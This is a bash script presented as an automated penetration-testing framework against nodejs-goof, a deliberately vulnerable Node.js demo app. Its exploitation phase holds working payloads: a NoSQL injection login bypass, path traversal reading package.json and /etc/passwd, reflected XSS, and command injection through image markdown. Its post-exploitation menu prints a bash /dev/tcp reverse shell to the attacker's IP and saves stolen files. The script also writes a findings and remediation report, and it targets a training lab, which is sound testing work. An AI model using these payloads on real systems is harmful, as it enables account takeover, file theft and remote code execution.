#!/bin/bash

###############################################################################
# Kali Linux Automated Penetration Testing Framework
# Target: nodejs-goof Vulnerable Application
# Red Hat Cybersecurity Engineering Demo
###############################################################################

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'

# Configuration
TARGET_HOST="${TARGET_HOST:-localhost}"
TARGET_PORT="${TARGET_PORT:-3001}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"
OUTPUT_DIR="./kali-pentest-results"
COOKIE_FILE="${OUTPUT_DIR}/cookies.txt"
WORDLIST_DIR="/usr/share/wordlists"

# Create output directory
mkdir -p "${OUTPUT_DIR}"

###############################################################################
# UTILITY FUNCTIONS
###############################################################################

banner() {
    clear
    echo -e "${RED}╔══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║${NC}  ${BOLD}${WHITE}Kali Linux Automated Penetration Testing Framework${NC}          ${RED}║${NC}"
    echo -e "${RED}║${NC}  ${CYAN}Target: ${TARGET_URL}${NC}                                      ${RED}║${NC}"
    echo -e "${RED}║${NC}  ${YELLOW}Red Hat Cybersecurity Engineering Demo${NC}                   ${RED}║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

print_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

print_error() {
    echo -e "${RED}[✗]${NC} $1"
}

print_info() {
    echo -e "${CYAN}[*]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_section() {
    echo ""
    echo -e "${BOLD}${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${PURPLE}$1${NC}"
    echo -e "${BOLD}${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

check_tool() {
    if command -v "$1" &> /dev/null; then
        return 0
    else
        print_error "Tool not found: $1"
        print_info "Install with: sudo apt install $2"
        return 1
    fi
}

check_target() {
    print_info "Checking target availability: ${TARGET_URL}"
    if curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}" | grep -q "200"; then
        print_success "Target is online and responding"
        return 0
    else
        print_error "Target is not responding"
        print_warning "Make sure nodejs-goof is running: npm start"
        return 1
    fi
}

###############################################################################
# PHASE 1: RECONNAISSANCE
###############################################################################

recon_nmap() {
    print_section "NMAP - Network Reconnaissance"
    
    if ! check_tool "nmap" "nmap"; then
        return 1
    fi
    
    print_info "Running Nmap service detection scan..."
    nmap -sV -sC -p ${TARGET_PORT} ${TARGET_HOST} -oA "${OUTPUT_DIR}/nmap-scan" 2>&1 | tee "${OUTPUT_DIR}/nmap-output.txt"
    
    print_success "Nmap scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/nmap-scan.*"
    
    read -p "Press Enter to continue..."
}

recon_whatweb() {
    print_section "WHATWEB - Technology Fingerprinting"
    
    if ! check_tool "whatweb" "whatweb"; then
        return 1
    fi
    
    print_info "Fingerprinting web technologies..."
    whatweb -v "${TARGET_URL}" 2>&1 | tee "${OUTPUT_DIR}/whatweb-output.txt"
    
    print_success "Whatweb scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/whatweb-output.txt"
    
    read -p "Press Enter to continue..."
}

recon_nikto() {
    print_section "NIKTO - Web Server Scanner"
    
    if ! check_tool "nikto" "nikto"; then
        return 1
    fi
    
    print_info "Running Nikto web server scan..."
    nikto -h "${TARGET_URL}" -o "${OUTPUT_DIR}/nikto-report.html" -Format html 2>&1 | tee "${OUTPUT_DIR}/nikto-output.txt"
    
    print_success "Nikto scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/nikto-report.html"
    
    read -p "Press Enter to continue..."
}

recon_dirb() {
    print_section "DIRB - Directory Enumeration"
    
    if ! check_tool "dirb" "dirb"; then
        return 1
    fi
    
    print_info "Enumerating directories and files..."
    dirb "${TARGET_URL}" "${WORDLIST_DIR}/dirb/common.txt" -o "${OUTPUT_DIR}/dirb-output.txt" -r 2>&1 | tee -a "${OUTPUT_DIR}/dirb-output.txt"
    
    print_success "DIRB scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/dirb-output.txt"
    
    read -p "Press Enter to continue..."
}

recon_all() {
    print_section "FULL RECONNAISSANCE SUITE"
    
    if ! check_target; then
        return 1
    fi
    
    recon_nmap
    recon_whatweb
    recon_nikto
    recon_dirb
    
    print_success "All reconnaissance scans completed!"
}

###############################################################################
# PHASE 2: VULNERABILITY SCANNING
###############################################################################

scan_zap_baseline() {
    print_section "OWASP ZAP - Baseline Scan"
    
    if ! check_tool "zap-baseline.py" "zaproxy"; then
        return 1
    fi
    
    print_info "Running OWASP ZAP baseline scan..."
    print_warning "This may take 5-10 minutes..."
    
    zap-baseline.py -t "${TARGET_URL}" -r "${OUTPUT_DIR}/zap-baseline-report.html" 2>&1 | tee "${OUTPUT_DIR}/zap-output.txt"
    
    print_success "ZAP baseline scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/zap-baseline-report.html"
    
    read -p "Press Enter to continue..."
}

scan_wfuzz() {
    print_section "WFUZZ - Web Application Fuzzer"
    
    if ! check_tool "wfuzz" "wfuzz"; then
        return 1
    fi
    
    print_info "Fuzzing for hidden directories..."
    wfuzz -c -z file,"${WORDLIST_DIR}/dirb/common.txt" \
        --hc 404 "${TARGET_URL}/FUZZ" 2>&1 | tee "${OUTPUT_DIR}/wfuzz-output.txt"
    
    print_success "Wfuzz scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/wfuzz-output.txt"
    
    read -p "Press Enter to continue..."
}

scan_npm_audit() {
    print_section "NPM AUDIT - Dependency Vulnerabilities"
    
    if ! check_tool "npm" "npm"; then
        return 1
    fi
    
    print_info "Scanning npm dependencies for vulnerabilities..."
    
    if [ -f "package.json" ]; then
        npm audit --json > "${OUTPUT_DIR}/npm-audit.json" 2>&1
        npm audit 2>&1 | tee "${OUTPUT_DIR}/npm-audit.txt"
        
        print_success "NPM audit completed"
        print_info "Results saved to: ${OUTPUT_DIR}/npm-audit.json"
    else
        print_error "package.json not found in current directory"
    fi
    
    read -p "Press Enter to continue..."
}

scan_all() {
    print_section "FULL VULNERABILITY SCAN SUITE"
    
    if ! check_target; then
        return 1
    fi
    
    scan_wfuzz
    scan_npm_audit
    
    print_info "Skipping ZAP (time-consuming). Run separately if needed."
    print_success "All vulnerability scans completed!"
    
    read -p "Press Enter to continue..."
}

###############################################################################
# PHASE 3: EXPLOITATION
###############################################################################

exploit_nosql_injection() {
    print_section "NoSQL INJECTION - Authentication Bypass"
    
    print_info "Testing NoSQL injection with MongoDB operators..."
    
    # Test 1: Failed login
    print_info "Test 1: Normal failed login"
    curl -s -X POST "${TARGET_URL}/login" \
        -H 'Content-Type: application/json' \
        -d '{"username":"admin@snyk.io","password":"WrongPassword"}' \
        -w "\nHTTP Status: %{http_code}\n" | head -5
    
    echo ""
    read -p "Press Enter for next test..."
    
    # Test 2: NoSQL injection bypass
    print_info "Test 2: NoSQL injection with \$gt operator"
    RESPONSE=$(curl -s -X POST "${TARGET_URL}/login" \
        -c "${COOKIE_FILE}" \
        -H 'Content-Type: application/json' \
        -d '{"username":"admin@snyk.io","password":{"$gt":""}}' \
        -w "\nHTTP_CODE:%{http_code}")
    
    echo "$RESPONSE" | head -10
    
    if echo "$RESPONSE" | grep -q "HTTP_CODE:302"; then
        print_success "NoSQL injection successful! Authentication bypassed!"
        print_info "Session cookie saved to: ${COOKIE_FILE}"
    else
        print_error "NoSQL injection failed"
    fi
    
    echo ""
    read -p "Press Enter for next test..."
    
    # Test 3: Blind injection
    print_info "Test 3: Blind NoSQL injection (no username)"
    curl -s -X POST "${TARGET_URL}/login" \
        -c "${COOKIE_FILE}" \
        -H 'Content-Type: application/json' \
        -d '{"username":{"$gt":""},"password":{"$gt":""}}' \
        -w "\nHTTP Status: %{http_code}\n" | head -5
    
    print_success "NoSQL injection tests completed"
    read -p "Press Enter to continue..."
}

exploit_directory_traversal() {
    print_section "DIRECTORY TRAVERSAL - Path Injection"
    
    # First authenticate
    print_info "Authenticating via NoSQL injection..."
    curl -s -X POST "${TARGET_URL}/login" \
        -c "${COOKIE_FILE}" \
        -H 'Content-Type: application/json' \
        -d '{"username":"admin@snyk.io","password":{"$gt":""}}' > /dev/null
    
    print_success "Authenticated"
    echo ""
    
    # Test directory traversal
    print_info "Exploiting directory traversal to read package.json..."
    curl -s -X POST "${TARGET_URL}/account_details" \
        -b "${COOKIE_FILE}" \
        -H 'Content-Type: application/json' \
        -d '{"email":"admin@snyk.io","firstname":"admin","lastname":"admin","country":"IL","phone":"+972551234123","layout":"./../package.json"}' \
        | grep -A 10 '"name"' | head -15
    
    print_success "Directory traversal successful!"
    print_info "Extracted package.json content above"
    
    read -p "Press Enter to continue..."
}

exploit_xss() {
    print_section "CROSS-SITE SCRIPTING (XSS)"
    
    print_info "Testing reflected XSS via redirectPage parameter..."
    
    PAYLOAD='"><script>alert(1)</script>'
    curl -s "${TARGET_URL}/login?redirectPage=${PAYLOAD}" \
        | grep -o '<input.*redirectPage.*>' | head -1
    
    echo ""
    print_success "XSS payload reflected in HTML"
    print_warning "Visit URL in browser to see alert: ${TARGET_URL}/login?redirectPage=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"
    
    read -p "Press Enter to continue..."
}

exploit_command_injection() {
    print_section "COMMAND INJECTION - Remote Code Execution"
    
    print_info "Testing command injection via image processing..."
    print_warning "This will create /tmp/kali_pwned if successful"
    
    PAYLOAD='![alt text](https://example.com/img.png;touch /tmp/kali_pwned "Image")'
    
    curl -s -X POST "${TARGET_URL}/create" \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        --data-urlencode "content=${PAYLOAD}" \
        -w "\nHTTP Status: %{http_code}\n"
    
    print_success "Command injection payload delivered!"
    print_info "Check for /tmp/kali_pwned on target server"
    print_warning "In a real scenario, this could be used for reverse shell"
    
    read -p "Press Enter to continue..."
}

exploit_info_disclosure() {
    print_section "INFORMATION DISCLOSURE - ST Directory Traversal"
    
    print_info "Attempting to read /etc/passwd via ST vulnerability..."
    
    curl -s "${TARGET_URL}/public/%2e%2e/%2e%2e/%2e%2e/etc/passwd" \
        | head -15
    
    print_success "Information disclosure successful!"
    print_info "/etc/passwd content displayed above"
    
    read -p "Press Enter to continue..."
}

exploit_sqlmap() {
    print_section "SQLMAP - Automated NoSQL Injection"
    
    if ! check_tool "sqlmap" "sqlmap"; then
        return 1
    fi
    
    print_info "Running SQLMap against login endpoint..."
    print_warning "This may take several minutes..."
    
    sqlmap -u "${TARGET_URL}/login" \
        --data='{"username":"admin@snyk.io","password":"test"}' \
        --headers="Content-Type: application/json" \
        --level=3 --risk=2 \
        --batch \
        --output-dir="${OUTPUT_DIR}/sqlmap" 2>&1 | tee "${OUTPUT_DIR}/sqlmap-output.txt"
    
    print_success "SQLMap scan completed"
    print_info "Results saved to: ${OUTPUT_DIR}/sqlmap/"
    
    read -p "Press Enter to continue..."
}

exploit_all() {
    print_section "FULL EXPLOITATION SUITE"
    
    if ! check_target; then
        return 1
    fi
    
    exploit_nosql_injection
    exploit_directory_traversal
    exploit_xss
    exploit_command_injection
    exploit_info_disclosure
    
    print_success "All exploits executed!"
    print_info "SQLMap skipped (time-consuming). Run separately if needed."
    
    read -p "Press Enter to continue..."
}

###############################################################################
# PHASE 4: POST-EXPLOITATION
###############################################################################

postex_reverse_shell_info() {
    print_section "REVERSE SHELL - Setup Instructions"
    
    print_info "To get a reverse shell, follow these steps:"
    echo ""
    echo -e "${YELLOW}1. On your Kali machine (attacker):${NC}"
    echo -e "   ${CYAN}nc -lvnp 4444${NC}"
    echo ""
    echo -e "${YELLOW}2. Get your IP address:${NC}"
    echo -e "   ${CYAN}ip addr show | grep inet${NC}"
    echo ""
    KALI_IP=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1 | head -1)
    echo -e "${YELLOW}3. Your IP appears to be: ${GREEN}${KALI_IP}${NC}"
    echo ""
    echo -e "${YELLOW}4. Trigger reverse shell with this curl command:${NC}"
    echo -e "${CYAN}curl -X POST ${TARGET_URL}/create \\${NC}"
    echo -e "${CYAN}  -H 'Content-Type: application/x-www-form-urlencoded' \\${NC}"
    echo -e "${CYAN}  --data-urlencode 'content=![alt text](https://x.com/i.png;bash -c \"bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1\" \"Image\")'${NC}"
    echo ""
    print_warning "Only works if target can reach your IP!"
    
    read -p "Press Enter to continue..."
}

postex_data_exfiltration() {
    print_section "DATA EXFILTRATION"
    
    print_info "Exfiltrating /etc/passwd..."
    curl -s "${TARGET_URL}/public/%2e%2e/%2e%2e/%2e%2e/etc/passwd" > "${OUTPUT_DIR}/exfiltrated-passwd.txt"
    print_success "Saved to: ${OUTPUT_DIR}/exfiltrated-passwd.txt"
    
    echo ""
    print_info "Exfiltrating package.json..."
    curl -s -X POST "${TARGET_URL}/login" -c "${COOKIE_FILE}" \
        -H 'Content-Type: application/json' \
        -d '{"username":"admin@snyk.io","password":{"$gt":""}}' > /dev/null
    
    curl -s -X POST "${TARGET_URL}/account_details" \
        -b "${COOKIE_FILE}" \
        -H 'Content-Type: application/json' \
        -d '{"email":"admin@snyk.io","firstname":"admin","lastname":"admin","country":"IL","phone":"+972551234123","layout":"./../package.json"}' \
        > "${OUTPUT_DIR}/exfiltrated-package.json"
    
    print_success "Saved to: ${OUTPUT_DIR}/exfiltrated-package.json"
    
    echo ""
    print_info "Data exfiltration complete!"
    print_info "Check ${OUTPUT_DIR}/ for exfiltrated files"
    
    read -p "Press Enter to continue..."
}

###############################################################################
# PHASE 5: REPORTING
###############################################################################

generate_report() {
    print_section "GENERATING PENETRATION TEST REPORT"
    
    REPORT_FILE="${OUTPUT_DIR}/pentest-report.txt"
    
    cat > "${REPORT_FILE}" << EOF
╔══════════════════════════════════════════════════════════════════╗
║          PENETRATION TEST REPORT                                 ║
║          nodejs-goof Vulnerable Application                      ║
╚══════════════════════════════════════════════════════════════════╝

Date: $(date)
Target: ${TARGET_URL}
Tester: Red Hat Cybersecurity Engineering

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EXECUTIVE SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

The penetration test revealed CRITICAL vulnerabilities in the nodejs-goof
application, including:

- Authentication bypass via NoSQL injection
- Directory traversal allowing arbitrary file read
- Remote code execution via command injection
- Cross-site scripting (XSS)
- Information disclosure
- 138 vulnerable dependencies

Risk Level: CRITICAL
Recommendation: Immediate remediation required

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
FINDINGS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. NoSQL Injection (CRITICAL)
   - Location: /login endpoint
   - Impact: Complete authentication bypass
   - CVSS: 9.8
   - CWE: CWE-89

2. Directory Traversal (HIGH)
   - Location: /account_details endpoint
   - Impact: Arbitrary file read
   - CVSS: 7.5
   - CWE: CWE-22

3. Command Injection (CRITICAL)
   - Location: /create endpoint
   - Impact: Remote code execution
   - CVSS: 10.0
   - CWE: CWE-78

4. Cross-Site Scripting (MEDIUM)
   - Location: /login?redirectPage parameter
   - Impact: Session hijacking
   - CVSS: 6.1
   - CWE: CWE-79

5. Information Disclosure (HIGH)
   - Location: /public/* (ST module)
   - Impact: System file access
   - CVSS: 7.5
   - CWE: CWE-22

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
REMEDIATION RECOMMENDATIONS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Input Validation
   - Sanitize all user input
   - Type-check JSON payloads
   - Whitelist allowed characters

2. Update Dependencies
   - Run: npm audit fix
   - Upgrade to latest stable versions
   - Remove unused packages

3. Implement Security Headers
   - Content-Security-Policy
   - X-Frame-Options
   - X-XSS-Protection

4. Code Review
   - Review all database queries
   - Audit file operations
   - Check command execution

5. Security Testing
   - Integrate SAST/DAST in CI/CD
   - Regular penetration testing
   - Dependency scanning

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
FILES GENERATED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

EOF

    # List all files in output directory
    ls -lah "${OUTPUT_DIR}" >> "${REPORT_FILE}"
    
    print_success "Report generated: ${REPORT_FILE}"
    print_info "Opening report..."
    
    cat "${REPORT_FILE}"
    
    read -p "Press Enter to continue..."
}

###############################################################################
# AUTOMATED FULL PENTEST
###############################################################################

run_full_pentest() {
    print_section "AUTOMATED FULL PENETRATION TEST"
    
    print_warning "This will run ALL tests automatically"
    print_warning "Estimated time: 10-15 minutes"
    echo ""
    read -p "Press Enter to continue or Ctrl+C to cancel..."
    
    if ! check_target; then
        return 1
    fi
    
    # Phase 1: Reconnaissance
    print_info "Phase 1/5: Reconnaissance"
    recon_nmap
    recon_whatweb
    
    # Phase 2: Vulnerability Scanning
    print_info "Phase 2/5: Vulnerability Scanning"
    scan_wfuzz
    scan_npm_audit
    
    # Phase 3: Exploitation
    print_info "Phase 3/5: Exploitation"
    exploit_nosql_injection
    exploit_directory_traversal
    exploit_xss
    exploit_command_injection
    exploit_info_disclosure
    
    # Phase 4: Post-Exploitation
    print_info "Phase 4/5: Post-Exploitation"
    postex_data_exfiltration
    
    # Phase 5: Reporting
    print_info "Phase 5/5: Reporting"
    generate_report
    
    print_success "FULL PENETRATION TEST COMPLETED!"
    print_info "All results saved to: ${OUTPUT_DIR}/"
}

###############################################################################
# MENU SYSTEM
###############################################################################

show_menu() {
    banner
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${WHITE}MAIN MENU${NC}"
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${GREEN}[1]${NC}  ${BOLD}Reconnaissance${NC}           - Nmap, Whatweb, Nikto"
    echo -e "${GREEN}[2]${NC}  ${BOLD}Vulnerability Scanning${NC}   - ZAP, Wfuzz, NPM Audit"
    echo -e "${GREEN}[3]${NC}  ${BOLD}Exploitation${NC}             - NoSQL, XSS, RCE, etc."
    echo -e "${GREEN}[4]${NC}  ${BOLD}Post-Exploitation${NC}        - Reverse shell, Data exfiltration"
    echo -e "${GREEN}[5]${NC}  ${BOLD}Generate Report${NC}          - Create penetration test report"
    echo ""
    echo -e "${YELLOW}[A]${NC}  ${BOLD}Run Full Automated Pentest${NC} - All phases automatically"
    echo ""
    echo -e "${BLUE}[T]${NC}  Check target status"
    echo -e "${BLUE}[C]${NC}  Clear output directory"
    echo -e "${BLUE}[V]${NC}  View results"
    echo -e "${RED}[Q]${NC}  Quit"
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════════════════════════${NC}"
}

show_recon_menu() {
    banner
    echo -e "${BOLD}${PURPLE}RECONNAISSANCE MENU${NC}"
    echo ""
    echo -e "${GREEN}[1]${NC} Nmap - Network & Service Discovery"
    echo -e "${GREEN}[2]${NC} Whatweb - Technology Fingerprinting"
    echo -e "${GREEN}[3]${NC} Nikto - Web Server Scanner"
    echo -e "${GREEN}[4]${NC} DIRB - Directory Enumeration"
    echo -e "${GREEN}[5]${NC} Run All Reconnaissance"
    echo -e "${RED}[B]${NC} Back to Main Menu"
    echo ""
}

show_scan_menu() {
    banner
    echo -e "${BOLD}${PURPLE}VULNERABILITY SCANNING MENU${NC}"
    echo ""
    echo -e "${GREEN}[1]${NC} OWASP ZAP - Baseline Scan (slow)"
    echo -e "${GREEN}[2]${NC} Wfuzz - Web Application Fuzzer"
    echo -e "${GREEN}[3]${NC} NPM Audit - Dependency Vulnerabilities"
    echo -e "${GREEN}[4]${NC} Run All Scans (except ZAP)"
    echo -e "${RED}[B]${NC} Back to Main Menu"
    echo ""
}

show_exploit_menu() {
    banner
    echo -e "${BOLD}${PURPLE}EXPLOITATION MENU${NC}"
    echo ""
    echo -e "${GREEN}[1]${NC} NoSQL Injection - Authentication Bypass"
    echo -e "${GREEN}[2]${NC} Directory Traversal - Path Injection"
    echo -e "${GREEN}[3]${NC} Cross-Site Scripting (XSS)"
    echo -e "${GREEN}[4]${NC} Command Injection - RCE"
    echo -e "${GREEN}[5]${NC} Information Disclosure - ST Traversal"
    echo -e "${GREEN}[6]${NC} SQLMap - Automated Injection (slow)"
    echo -e "${GREEN}[7]${NC} Run All Exploits (except SQLMap)"
    echo -e "${RED}[B]${NC} Back to Main Menu"
    echo ""
}

show_postex_menu() {
    banner
    echo -e "${BOLD}${PURPLE}POST-EXPLOITATION MENU${NC}"
    echo ""
    echo -e "${GREEN}[1]${NC} Reverse Shell - Setup Instructions"
    echo -e "${GREEN}[2]${NC} Data Exfiltration"
    echo -e "${RED}[B]${NC} Back to Main Menu"
    echo ""
}

check_target_status() {
    banner
    print_section "TARGET STATUS CHECK"
    check_target
    echo ""
    read -p "Press Enter to continue..."
}

clear_output() {
    banner
    print_section "CLEAR OUTPUT DIRECTORY"
    print_warning "This will delete all files in: ${OUTPUT_DIR}"
    read -p "Are you sure? (y/N): " confirm
    
    if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
        rm -rf "${OUTPUT_DIR}"/*
        mkdir -p "${OUTPUT_DIR}"
        print_success "Output directory cleared"
    else
        print_info "Operation cancelled"
    fi
    
    read -p "Press Enter to continue..."
}

view_results() {
    banner
    print_section "VIEW RESULTS"
    
    if [ -z "$(ls -A ${OUTPUT_DIR})" ]; then
        print_warning "No results found in ${OUTPUT_DIR}"
    else
        print_info "Files in ${OUTPUT_DIR}:"
        ls -lah "${OUTPUT_DIR}"
    fi
    
    echo ""
    read -p "Press Enter to continue..."
}

###############################################################################
# MAIN PROGRAM
###############################################################################

main() {
    while true; do
        show_menu
        read -p "$(echo -e ${BOLD}${CYAN}'Select option: '${NC})" choice
        
        case $choice in
            1)
                while true; do
                    show_recon_menu
                    read -p "$(echo -e ${BOLD}${CYAN}'Select option: '${NC})" recon_choice
                    case $recon_choice in
                        1) recon_nmap ;;
                        2) recon_whatweb ;;
                        3) recon_nikto ;;
                        4) recon_dirb ;;
                        5) recon_all ;;
                        [Bb]) break ;;
                        *) print_error "Invalid option" ; sleep 1 ;;
                    esac
                done
                ;;
            2)
                while true; do
                    show_scan_menu
                    read -p "$(echo -e ${BOLD}${CYAN}'Select option: '${NC})" scan_choice
                    case $scan_choice in
                        1) scan_zap_baseline ;;
                        2) scan_wfuzz ;;
                        3) scan_npm_audit ;;
                        4) scan_all ;;
                        [Bb]) break ;;
                        *) print_error "Invalid option" ; sleep 1 ;;
                    esac
                done
                ;;
            3)
                while true; do
                    show_exploit_menu
                    read -p "$(echo -e ${BOLD}${CYAN}'Select option: '${NC})" exploit_choice
                    case $exploit_choice in
                        1) exploit_nosql_injection ;;
                        2) exploit_directory_traversal ;;
                        3) exploit_xss ;;
                        4) exploit_command_injection ;;
                        5) exploit_info_disclosure ;;
                        6) exploit_sqlmap ;;
                        7) exploit_all ;;
                        [Bb]) break ;;
                        *) print_error "Invalid option" ; sleep 1 ;;
                    esac
                done
                ;;
            4)
                while true; do
                    show_postex_menu
                    read -p "$(echo -e ${BOLD}${CYAN}'Select option: '${NC})" postex_choice
                    case $postex_choice in
                        1) postex_reverse_shell_info ;;
                        2) postex_data_exfiltration ;;
                        [Bb]) break ;;
                        *) print_error "Invalid option" ; sleep 1 ;;
                    esac
                done
                ;;
            5) generate_report ;;
            [Aa]) run_full_pentest ;;
            [Tt]) check_target_status ;;
            [Cc]) clear_output ;;
            [Vv]) view_results ;;
            [Qq])
                echo -e "${GREEN}Exiting... Stay secure!${NC}"
                exit 0
                ;;
            *)
                print_error "Invalid option"
                sleep 1
                ;;
        esac
    done
}

# Run main program
main
